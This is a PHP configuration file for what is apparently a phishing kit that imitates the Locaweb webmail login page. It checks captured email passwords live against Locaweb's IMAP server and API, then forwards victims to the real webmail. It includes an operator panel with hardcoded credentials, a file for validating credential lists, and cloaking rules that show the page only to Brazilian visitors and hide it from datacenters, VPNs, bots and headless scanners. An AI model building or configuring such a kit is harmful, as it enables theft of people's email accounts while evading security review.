<?php
declare(strict_types=1);

/**
 * Copie para config.local.php e ajuste.
 * Nunca commite config.local.php (contém segredos).
 */
return [
    'app_name'     => 'Lab Webmail Auth',
    'page_title'   => 'Webmail Locaweb : Faça o Login do Webmail Seguro',
    'env'          => 'local',
    'base_url'     => 'http://127.0.0.1:8080',
    'url_prefix'   => '',
    'data_dir'     => __DIR__ . '/var/data',
    'session_name' => 'lab_webmail_sid',

    /** Valida e-mail/senha no IMAP Locaweb (email-ssl.com.br:993) ou fallback mail.dominio. */
    'mailbox_verify' => true,

    /** Valida via API HTTP webmail-seguro.com.br; fallback IMAP se captcha/conexão falhar. */
    'webmail_http_verify'  => true,
    'webmail_imap_fallback'  => true,
    'webmail_api_url'        => 'https://webmail-seguro.com.br',
    'webmail_api_timeout'    => 45,

    /** Após login válido → webmail Locaweb v2 (desktop e mobile). */
    'panel_redirect'   => 'https://webmail-seguro.com.br/v2/',
    'success_redirect' => 'https://webmail-seguro.com.br/v2/',

    /** Turnstile: 1x…AA = widget visual verde (sem aviso de teste). Produção: chave 0x… do domínio. */
    'turnstile_site_key' => '1x00000000000000000000AA',
    'turnstile_enabled'  => true,

    'locaweb_imap' => [
        'host'      => 'email-ssl.com.br',
        'imap_port' => 993,
        'pop3_port' => 995,
        'security'  => 'ssl/tls',
    ],

    'security' => [
        'csrf_ttl_seconds'   => 3600,
        'login_max_attempts' => 10,
        'login_window_seconds' => 300,
    ],

    /**
     * Laboratório IMAP: só habilite com conta de TESTE sua.
     * Em produção real, autenticação fica no servidor de e-mail, não no PHP do front.
     */
    'imap_lab' => [
        'enabled'  => false,
        'host'     => 'imap.example.com',
        'port'     => 993,
        'flags'    => '/imap/ssl/validate-cert',
        'timeout'  => 8,
    ],

    /** Só local: valida e-mail:senha de listas.txt no lab (não chama Locaweb/IMAP externo). */
    'allow_credentials_list' => false,
    'credentials_list'       => __DIR__ . '/listas.txt',

    'panel_name'       => 'D3V Danadinho',
    'panel_user'       => 'Danadinho',
    'panel_pass'       => 'Danado2027',
    'panel_marquee'    => 'Quero alugar um novo apartamento, preciso de 5 mil. Se Deus quiser, vou deixar você rico, D3v Dandinho! 🙏🚀',
    'panel_reset_key'  => 'lab-local-reset-key',

    'blocked_redirect' => 'https://google.com/erro',
    'max_ip_visits'       => 4,
    'max_ip_api_attempts' => 4,
    'session_save_path'   => null,

    'anti_bot' => [
        'enabled'               => true,
        'allowed_countries'     => ['BR'],
        'enforce_country'       => true,
        'deny_hosting'          => true,
        'deny_proxy_vpn'        => true,
        'deny_datacenter_asn'   => true,
        'deny_bots_ua'          => true,
        'deny_bad_headers'      => true,
        'deny_empty_ua'         => true,
        'deny_headless_signals' => true,
        'enforce_device'        => true,
        'strict_geo_unknown'    => true,
        'allow_localhost'       => false,
        'redirect'              => null,
        'log_blocks'            => true,
    ],
];
